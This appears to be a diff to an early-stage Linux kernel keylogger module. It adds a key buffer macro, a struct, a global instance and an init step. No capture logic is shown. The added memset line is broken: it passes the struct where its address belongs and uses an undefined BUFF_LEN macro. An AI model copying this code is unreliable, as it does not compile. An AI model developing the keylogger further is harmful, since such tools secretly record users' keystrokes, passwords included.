@@ -14,11 +14,15 @@
 #define DEVICE_NAME "My Key Logger"            // Use this macro for logging
 #define HARKLE_KERROR(module, funcName, errNum) do { printk(KERN_ERR "%s: <<<ERROR>>> %s() returned %d!\n", module, #funcName, errNum); } while (0);
 #define HARKLE_KINFO(module, msg) do { printk(KERN_INFO "%s: %s\n", module, msg); } while (0);
+#define BUFF_SIZE 16                           // 
 
 //////////////
 /* TYPEDEFS */
 //////////////
-// typedef struct?
+typedef struct _myKeyLogger
+{
+    char keyStr[BUFF_SIZE + 1];
+} myKeyLogger, *myKeyLogger_ptr;
 
 /////////////////////////
 /* FUNCTION PROTOTYPES */
@@ -31,7 +35,7 @@ static void __exit key_logger_exit(void);
 /////////////
 /* GLOBALS */
 /////////////
-// global struct?
+myKeyLogger myKL;
 
 //////////////////////////
 /* FUNCTION DEFINITIONS */
@@ -41,7 +45,8 @@ static int __init key_logger_init(void)
     int retVal = 0;
     
     HARKLE_KINFO(DEVICE_NAME, "Key logger loading");
-    // Code here
+    // 1. Initialize myKeyLogger struct
+    memset(myKL, 0x0, BUFF_LEN * sizeof(char));
     
     // DONE
     HARKLE_KINFO(DEVICE_NAME, "Key logger loaded");
